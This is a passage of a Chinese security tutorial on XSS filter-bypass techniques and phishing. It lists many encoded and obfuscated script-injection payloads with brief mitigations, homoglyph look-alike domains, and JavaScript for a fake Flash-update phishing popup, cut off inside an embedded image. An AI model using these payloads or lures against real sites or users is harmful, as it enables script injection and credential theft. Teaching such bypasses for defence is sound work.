+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert`1`&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>由于正则表达式的不严密导致可以使用大小写来进行绕过</p>
+<p>解决方案：使用正则表达式忽略大小写的模式</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>由于只进行了一次关键字符的替换导致可以被双写绕过</p>
+<p>解决方案：循环检测关键字符</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><p>Unicode编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(&#x27;\u0061\u006c\u0065\u0072\u0074\u0028\u0022\u0078\u0073\u0073\u0022\u0029\u003b&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>url编码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&#x27;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>
+
+<p>Ascii码绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>hex绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=eval(&#x27;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>八进制</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=alert(&#x27;\170\163\163&#x27;)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>base64绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&#x27;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&#x27;))&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="标签绕过"><a href="#标签绕过" class="headerlink" title="标签绕过"></a>标签绕过</h3><p>假如所有HTML标签都被过滤，可以尝试自定义标签来进行绕过。</p>
+<p>锚点：<code>#</code>可以迅速定位到某个id,或者class的位置，只要能让锚点指向到我们自定义标签，然后在自定义标签当中写入<code>onfocus</code>事件就可以直接完成XSS。</p>
+<ol>
+<li><p>首先写入一个自定义标签的XSS，注意标注id值，与tabIndex的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;qweasd id=&#x27;qweasd&#x27; onfocus=alert(1) tabIndex=1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>tabIndex的作用见：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/tabindex">HTML</a>，主要目的是让自定义标签获得focus</p>
+</li>
+<li><p>在GET请求最后追加上<code>锚点+id值</code>，直接进行访问即可。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xxxxx.com?id=&lt;qweasd id=&#x27;qweasd&#x27; onfocus=alert(1) tabIndex=1&gt;#qweasd</span><br></pre></td></tr></table></figure>
+
+<p>假如是存储型XSS可以直接进行加上锚点访问。</p>
+</li>
+</ol>
+<p>解决方案：禁止<code>&lt;&gt;</code>的输入或者进行HTML编码</p>
+<h3 id="字符拼接"><a href="#字符拼接" class="headerlink" title="字符拼接"></a>字符拼接</h3><p>利用eval</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&#x27;(`xss`);&#x27;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>利用top</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="其它字符混淆"><a href="#其它字符混淆" class="headerlink" title="其它字符混淆"></a>其它字符混淆</h3><p>有的waf可能是用正则表达式去检测是否有xss攻击，如果我们能fuzz出正则的规则，则我们就可以使用其它字符去混淆我们注入的代码了<br>下面举几个简单的例子</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可利用注释、标签的优先级等</span><br><span class="line">1.&lt;&lt;script&gt;alert(&quot;xss&quot;);//&lt;&lt;/script&gt;</span><br><span class="line">2.&lt;title&gt;&lt;img src=&lt;/title&gt;&gt;&lt;img src=x onerror=&quot;alert(`xss`);&quot;&gt; //因为title标签的优先级比img的高，所以会先闭合title，从而导致前面的img标签无效</span><br><span class="line">3.&lt;SCRIPT&gt;var a=&quot;\\&quot;;alert(&quot;xss&quot;);//&quot;;&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="钓鱼"><a href="#钓鱼" class="headerlink" title="钓鱼"></a>钓鱼</h2><h3 id="辨别域名"><a href="#辨别域名" class="headerlink" title="辨别域名"></a>辨别域名</h3><p><strong>OPPO 官网 真假域名</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 真域名</span></span><br><span class="line">www.oppo.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假域名</span></span><br><span class="line">www.οppο.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>Pornhub官网 真假域名</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 真域名</span></span><br><span class="line">www.pornhub.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假域名</span></span><br><span class="line">www.ρornhub.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>唯品会官网 真假域名</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 真域名</span></span><br><span class="line">www.vip.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 假域名</span></span><br><span class="line">www.νip.com</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用拉丁字母</strong>注册的域名伪造钓鱼网站。</p>
+<h3 id="flash钓鱼"><a href="#flash钓鱼" class="headerlink" title="flash钓鱼"></a>flash钓鱼</h3><p>写一个flash弹窗页面</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s1 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">s1.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">s1.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.0/jquery.min.js&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> head = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>];</span><br><span class="line">head.<span class="title function_">appendChild</span>(s1);</span><br><span class="line">s1.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> s2 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">  s2.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;text/javascript&#x27;</span>);</span><br><span class="line">  s2.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>,<span class="string">&#x27;//cdnjs.cloudflare.com/ajax/libs/layer/3.1.1/layer.js&#x27;</span>);</span><br><span class="line">  head.<span class="title function_">appendChild</span>(s2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> s3 = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;link&#x27;</span>);</span><br><span class="line">s3.<span class="title function_">setAttribute</span>(<span class="string">&#x27;type&#x27;</span>,<span class="string">&#x27;text/css&#x27;</span>);</span><br><span class="line">s3.<span class="title function_">setAttribute</span>(<span class="string">&#x27;rel&#x27;</span>,<span class="string">&#x27;stylesheet&#x27;</span>);</span><br><span class="line">s3.<span class="title function_">setAttribute</span>(<span class="string">&#x27;href&#x27;</span>,<span class="string">&#x27;//cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css&#x27;</span>);</span><br><span class="line">head.<span class="title function_">appendChild</span>(s3);</span><br><span class="line"><span class="keyword">var</span> content = <span class="string">&quot;&lt;style&gt;*&#123;margin:0;padding:0&#125;#flash&#123;width:613px;height:324px&#125;#head&#123;width:100%;height:66px;background-image:url(&#x27;data:image/png;base64,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